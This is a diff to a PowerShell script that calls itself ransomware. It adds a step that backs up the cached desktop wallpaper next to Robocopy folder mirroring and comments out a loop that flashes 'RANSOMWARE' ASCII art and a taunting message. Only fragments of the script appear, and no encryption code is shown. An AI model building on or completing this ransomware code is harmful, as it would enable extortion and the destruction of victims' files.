@@ -25,6 +25,10 @@
 #Copy folder structure
 Robocopy $targetdir $backupdir /E /XF *.* | out-null
 
+#Backup wallpaper
+$currentwallpaper = (Get-ChildItem $env:AppData\Microsoft\Windows\Themes\CachedFiles| where name -Like "CachedImage*")
+Copy-item -Path $currentwallpaper.FullName -Destination $backupdir\$currentwallpaper
+
 foreach ($file in $files)
 {
 #Ignore files bigger than 1GB, to speed things up
@@ -214,8 +218,8 @@ $intro =
     $$$"                         $$$$"
                                                                                                                                                 
 '
-1..99 | % {
-    cls; ""; write-host $intro -ForegroundColor White; write "               RANSOMWARE";write "            MuHaHaHaHaHAHAHA!!!";""; Start-Sleep 1;}
+#1..99 | % {
+    #cls; ""; write-host $intro -ForegroundColor White; write "               RANSOMWARE";write "            MuHaHaHaHaHAHAHA!!!";""; Start-Sleep 1;}
 
 
 
